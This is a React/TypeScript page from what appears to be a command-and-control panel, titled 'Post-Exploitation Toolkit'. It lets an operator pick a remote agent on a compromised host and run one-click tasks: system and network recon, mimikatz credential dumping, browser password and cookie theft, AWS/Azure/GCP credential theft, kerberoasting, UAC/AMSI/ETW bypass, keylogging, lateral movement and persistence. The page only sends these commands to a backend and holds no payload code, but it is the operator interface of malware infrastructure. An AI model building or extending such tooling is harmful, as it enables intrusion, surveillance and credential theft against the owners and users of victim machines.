"use client";

import { useEffect, useState, useCallback } from "react";
import { StatusBadge } from "@/components/UI";
import { API_BASE } from "@/lib/constants";
import { apiGet } from "@/lib/api";

interface ToolkitAgent {
  ID?: string;
  Hostname?: string;
  IP?: string;
  OS?: string;
  id?: string;
  hostname?: string;
}

interface RecentTask {
  ID?: string;
  id?: string;
  AgentID?: string;
  agent_id?: string;
  Type?: string;
  type?: string;
  Command?: string;
  command?: string;
  Status?: string;
  status?: string;
  CreatedAt?: string;
  created_at?: string;
}

export default function ToolkitPage() {
  const [toolkitAgents, setToolkitAgents] = useState<ToolkitAgent[]>([]);
  const [recentTasks, setRecentTasks] = useState<RecentTask[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedAgent, setSelectedAgent] = useState("");
  const [agentInfo, setAgentInfo] = useState<Record<string, unknown> | null>(null);
  const [toast, setToast] = useState<string | null>(null);

  const runAction = async (action: string, param = "") => {
    if (!selectedAgent) {
      setToast("Select an agent first");
      return;
    }
    try {
      const body = new URLSearchParams({ action, param });
      const res = await fetch(`${API_BASE}?p=/toolkit/agents/${selectedAgent}/action&format=json`, {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: body.toString(),
      });
      const data = await res.json();
      if (data.success) {
        setToast(`Dispatched ${action} (task #${data.task_id})`);
        loadData();
      } else {
        setToast(data.error || "Action failed");
      }
    } catch (e) {
      setToast(String(e));
    }
    setTimeout(() => setToast(null), 3000);
  };

  useEffect(() => {
    if (!selectedAgent) { setAgentInfo(null); return; }
    apiGet<{ agent?: Record<string, unknown> }>(`/toolkit/agents/${selectedAgent}/info`)
      .then((d) => setAgentInfo(d.agent || null))
      .catch(() => setAgentInfo(null));
  }, [selectedAgent]);

  const loadData = useCallback(async () => {
    try {
      const [agentsRes, tasksRes] = await Promise.all([
        fetch(`${API_BASE}?p=/agents&format=json`),
        fetch(`${API_BASE}?p=/toolkit/results&format=json`, { credentials: "include" }),
      ]);
      if (!agentsRes.ok) throw new Error(`HTTP ${agentsRes.status}`);
      if (!tasksRes.ok) throw new Error(`HTTP ${tasksRes.status}`);
      const agentsData = await agentsRes.json();
      const tasksData = await tasksRes.json();
      setToolkitAgents(agentsData.Agents || agentsData.agents || []);
      setRecentTasks(tasksData.Tasks || tasksData.tasks || tasksData.results || tasksData.data || []);
    } catch (e) { console.error("Toolkit: load data failed", e); }
    setLoading(false);
  }, []);

  useEffect(() => { Promise.resolve().then(() => loadData()); }, [loadData]);

  const quickActions = [
    { label: "whoami", value: "whoami" },
    { label: "hostname", value: "hostname" },
    { label: "ipconfig", value: "ipconfig" },
    { label: "systeminfo", value: "systeminfo" },
    { label: "ps", value: "ps" },
    { label: "screenshot", value: "screenshot" },
    { label: "beacon_now", value: "beacon_now" },
    { label: "mimikatz", value: "mimikatz" },
    { label: "creds", value: "creds" },
    { label: "elevate", value: "elevate" },
  ];

  const categories = [
    { name: "System Recon", color: "cyan", commands: [
      { cmd: "whoami", desc: "Current user identity" },
      { cmd: "hostname", desc: "Hostname" },
      { cmd: "ipconfig", desc: "Network config" },
      { cmd: "systeminfo", desc: "System details" },
      { cmd: "env", desc: "Environment variables" },
      { cmd: "uptime", desc: "System uptime" },
    ]},
    { name: "Process & Service", color: "emerald", commands: [
      { cmd: "ps", desc: "Process list" },
      { cmd: "tasklist", desc: "Detailed task list" },
      { cmd: "services", desc: "Service list" },
      { cmd: "schtasks", desc: "Scheduled tasks" },
      { cmd: "drivers", desc: "Driver list" },
    ]},
    { name: "Network Recon", color: "blue", commands: [
      { cmd: "netstat", desc: "Connection state" },
      { cmd: "netstat -an", desc: "All connections" },
      { cmd: "arp -a", desc: "ARP cache" },
      { cmd: "route print", desc: "Routing table" },
      { cmd: "net user", desc: "Local users" },
      { cmd: "net localgroup", desc: "Local admin group" },
      { cmd: "av", desc: "AV detection" },
    ]},
    { name: "Credential Access", color: "rose", commands: [
      { cmd: "mimikatz", desc: "Credential extraction" },
      { cmd: "creds_dump", desc: "System credential export" },
      { cmd: "browser_steal", desc: "Browser password steal" },
      { cmd: "cookie_export", desc: "Cookie export" },
      { cmd: "vpn_creds", desc: "VPN/SSH credential extraction" },
      { cmd: "wifi_creds", desc: "WiFi password extraction" },
      { cmd: "kerberoast", desc: "Kerberoast attack" },
      { cmd: "cloud_steal", desc: "Cloud credential theft (AWS/Azure/GCP)" },
    ]},
    { name: "PrivEsc & Bypass", color: "amber", commands: [
      { cmd: "privesc_check", desc: "Privilege escalation detection" },
      { cmd: "elevate", desc: "Elevate (BypassUAC)" },
      { cmd: "uac_bypass", desc: "UAC bypass" },
      { cmd: "amsi_bypass", desc: "AMSI bypass" },
      { cmd: "etw_bypass", desc: "ETW bypass" },
    ]},
    { name: "Screen & Monitor", color: "purple", commands: [
      { cmd: "screenshot", desc: "Single screenshot" },
      { cmd: "keylogger_start", desc: "Start keylogger" },
      { cmd: "keylogger_stop", desc: "Stop keylogger" },
      { cmd: "keylogger_dump", desc: "Dump keylogger" },
      { cmd: "clipboard_get", desc: "Get clipboard" },
    ]},
    { name: "Lateral & Persist", color: "teal", commands: [
      { cmd: "lateral", desc: "Lateral movement" },
      { cmd: "persistence", desc: "Install persistence" },
    ]},
  ];

  const colorMap: Record<string, string> = {
    cyan: "bg-cyan-500/10 text-cyan-400 border-cyan-500/30",
    emerald: "bg-emerald-500/10 text-emerald-400 border-emerald-500/30",
    blue: "bg-blue-500/10 text-blue-400 border-blue-500/30",
    rose: "bg-rose-500/10 text-rose-400 border-rose-500/30",
    amber: "bg-amber-500/10 text-amber-400 border-amber-500/30",
    purple: "bg-purple-500/10 text-purple-400 border-purple-500/30",
    teal: "bg-teal-500/10 text-teal-400 border-teal-500/30",
  };

  return (
    <div className="max-w-7xl mx-auto mb-20 md:mb-0">
      {toast && (
        <div className="mb-3 px-4 py-2 bg-indigo-50 dark:bg-indigo-900/20 border border-indigo-200 rounded-2xl text-sm text-indigo-700">{toast}</div>
      )}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between mb-4 sm:mb-6 gap-3">
        <div>
          <h1 className="text-2xl sm:text-3xl font-semibold tracking-tight text-slate-900 dark:text-slate-100">Post-Exploitation Toolkit</h1>
          <p className="text-slate-500 dark:text-slate-400 text-xs sm:text-sm mt-1">One-click execution of common post-exploitation operations</p>
        </div>
        <div className="flex items-center gap-2">
          <span className="text-sm text-slate-500 dark:text-slate-400">Target Agent:</span>
          <select value={selectedAgent} onChange={(e) => setSelectedAgent(e.target.value)} className="px-3 py-2 ui-card rounded-lg text-sm focus:outline-none focus:border-blue-500 min-w-[200px]">
            <option value="">-- Select Agent --</option>
            {toolkitAgents.map((a, i) => (
              <option key={i} value={a.ID || ""}>
                {(a.Hostname || "unknown")} ({a.IP || "-"})
              </option>
            ))}
          </select>
        </div>
      </div>

      <div className="grid grid-cols-1 xl:grid-cols-4 gap-6">
        <div className="xl:col-span-3 space-y-4">
          <div className="ui-card p-4">
            <div className="flex items-center gap-2 mb-3">
              <span className="text-amber-400 text-sm font-bold">!</span>
              <span className="text-xs font-semibold text-[var(--text-secondary)] dark:text-gray-300">Quick Actions</span>
            </div>
            <div className="flex flex-wrap gap-2">
              {quickActions.map((qa) => (
                <button key={qa.value} onClick={() => runAction(qa.value)} className="px-3 py-2 bg-[var(--card-bg)] hover:bg-blue-50 dark:hover:bg-blue-900/20 border border-[var(--border)] hover:border-blue-500/30 rounded-2xl text-xs text-gray-600 dark:text-slate-500 dark:text-slate-400 hover:text-blue-600 dark:hover:text-blue-400 transition-all">
                  {qa.label}
                </button>
              ))}
            </div>
          </div>

          {loading ? (
            <div className="space-y-4">
              {[1,2,3].map(i => <div key={i} className="h-32 bg-slate-200 dark:bg-slate-800 rounded-2xl animate-pulse" />)}
            </div>
          ) : (
            categories.map((cat) => (
              <div key={cat.name} className="ui-card overflow-hidden">
                <div className="flex items-center justify-between px-5 py-3.5 cursor-pointer hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
                  <div className="flex items-center gap-3">
                    <div className={`w-8 h-8 rounded-2xl flex items-center justify-center border ${colorMap[cat.color]}`}>
                      <span className="text-xs font-bold">{cat.name[0]}</span>
                    </div>
                    <span className="font-semibold text-sm text-slate-900 dark:text-slate-100 dark:text-gray-200">{cat.name}</span>
                    <span className="text-[10px] px-2 py-0.5 bg-slate-100 dark:bg-slate-700 text-gray-500 dark:text-slate-500 dark:text-slate-400 rounded-full">{cat.commands.length}</span>
                  </div>
                </div>
                <div className="px-5 pb-4 space-y-1">
                  {cat.commands.map((c) => (
                    <button key={c.cmd} onClick={() => runAction(c.cmd)} className="w-full flex items-center gap-3 px-3 py-2 rounded-2xl hover:bg-slate-50 dark:hover:bg-slate-700/50 border border-transparent hover:border-slate-200 dark:hover:border-slate-700 transition-all text-left">
                      <span className={`text-xs font-mono font-medium w-28 shrink-0 ${colorMap[cat.color]?.split(" ")[1] || "text-blue-600 dark:text-blue-400"}`}>{c.cmd}</span>
                      <span className="text-xs text-gray-500">{c.desc}</span>
                      <span className="ml-auto text-[10px] text-slate-500 dark:text-slate-400">Run</span>
                    </button>
                  ))}
                </div>
              </div>
            ))
          )}
        </div>

        <div className="space-y-4">
          {agentInfo && (
            <div className="ui-card p-4 text-xs space-y-1">
              <div className="font-semibold text-[var(--text-secondary)] dark:text-gray-300 mb-2">Agent Info</div>
              <div>Host: {String(agentInfo.hostname || agentInfo.Hostname || "-")}</div>
              <div>IP: {String(agentInfo.ip || agentInfo.IP || "-")}</div>
              <div>Integrity: {String(agentInfo.integrity || agentInfo.Integrity || "-")}</div>
              <div>Interval: {String(agentInfo.current_interval ?? agentInfo.CurrentInterval ?? "-")}s</div>
            </div>
          )}
          <div className="ui-card overflow-hidden">
            <div className="flex items-center justify-between px-4 py-3.5 border-b border-[var(--border)]">
              <span className="text-sm font-semibold text-[var(--text-secondary)] dark:text-gray-300">Recent Results</span>
              <span className="text-[10px] text-gray-500 bg-slate-100 dark:bg-slate-700 px-1.5 py-0.5 rounded-full">{recentTasks.length}</span>
            </div>
            <div className="max-h-[600px] overflow-y-auto">
              {recentTasks.length === 0 ? (
                <div className="p-8 text-center text-slate-500 dark:text-slate-400 text-xs">No task results yet</div>
              ) : (
                recentTasks.map((t, i) => (
                  <div key={i} className="px-4 py-3 border-b border-slate-100 dark:border-slate-700 last:border-0 hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-[10px] font-mono text-slate-500 dark:text-slate-400">{(t.AgentID || t.agent_id || "").toString().slice(0, 8)}</span>
                      <StatusBadge status={t.Status || t.status || ""} />
                    </div>
                    <div className="text-xs font-medium text-[var(--text-secondary)] dark:text-gray-300 truncate">{t.Type || t.type}: {t.Command || t.command}</div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
